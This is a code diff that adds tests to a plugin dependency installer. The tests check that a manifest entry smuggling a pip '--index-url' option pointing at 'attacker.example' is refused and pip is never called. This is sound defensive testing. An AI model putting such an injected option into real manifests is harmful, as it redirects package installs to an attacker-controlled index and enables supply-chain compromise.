@@ -174,6 +174,42 @@ class TestPluginDeps:
             result = deps_install("test-plugin")
             assert result == 0
 
+    def test_deps_install_rejects_pip_option_injection(self, tmp_path, monkeypatch):
+        """A non-PEP-508 manifest entry (pip option) is refused, never installed."""
+        monkeypatch.chdir(tmp_path)
+        _make_plugin(
+            tmp_path,
+            "evil-plugin",
+            manifest={
+                "name": "evil-plugin",
+                "version": "0.1.0",
+                "description": "Test",
+                "python_dependencies": ["--index-url=http://attacker.example/simple"],
+            },
+        )
+
+        from core.cli.commands.plugin.deps import deps_install
+
+        with (
+            patch(
+                "core.cli.commands.plugin.deps._check_python_dep", return_value=False
+            ),
+            patch("core.cli.commands.plugin.deps.subprocess.run") as mock_run,
+        ):
+            result = deps_install("evil-plugin", yes=True)
+            assert result == 1
+            mock_run.assert_not_called()  # pip is never invoked
+
+    def test_is_valid_requirement(self):
+        from core.cli.commands.plugin.deps import _is_valid_requirement
+
+        assert _is_valid_requirement("requests>=2.0")
+        assert _is_valid_requirement("mineru[pipeline]>=3.4.4,<4")
+        assert not _is_valid_requirement("--index-url=http://x/simple")
+        assert not _is_valid_requirement("-r requirements.txt")
+        assert not _is_valid_requirement("")
+        assert not _is_valid_requirement(None)
+
 
 # ──────────────────────────────────────────
 # TestPluginConfig
